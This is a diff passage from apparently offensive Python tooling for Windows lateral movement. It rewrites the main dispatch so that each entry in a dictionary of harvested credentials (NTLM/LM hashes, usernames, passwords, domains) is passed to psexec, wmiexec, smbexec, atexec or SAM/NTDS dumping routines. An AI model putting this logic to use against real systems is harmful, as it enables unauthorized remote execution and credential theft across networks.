-        if usr == None or pwd == None:
-            print(2)
+        if not creds_dict and usr == None and pwd == None:
             sys.exit("[!] If you are trying to exploit a system you need a username and password")
         if target == None and target_filename == None and xml_targets == None:
             sys.exit("[!] If you are trying to exploit a system you need at least one target")
@@ -3960,21 +4097,20 @@ Create Pasteable Double Encoded Script:
         sys.exit("[!] You do not execute the --secrets-dump with a method, it should be executed on its own.")
     if not final_targets and not execution:
         sys.exit("[!] No targets to exploit or commands to provide")
- 
-    if psexec_cmd:
-        psexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port)
-    elif wmiexec_cmd:
-        wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port)
-    elif netview_cmd:
-        netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port)
-    elif smbexec_cmd:
-        smbexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port)
-    elif atexec_cmd:
-        atexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port)
-    elif sam_dump:
-        sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, final_targets, pwd, scan_type, verbose, verify_port)
-    else:
-        print(instructions)
+
+    if creds_dict:
+        for key, value in creds_dict.iteritems():
+            SID = value[0]
+            LM = value[1]
+            NTLM = value[2]
+            hash = value[3]
+            usr = value[4]
+            pwd = value[5]
+            dom = value[6]
+            method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output)
+    else: 
+        method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output)
+
 
 if __name__ == '__main__':
     main()
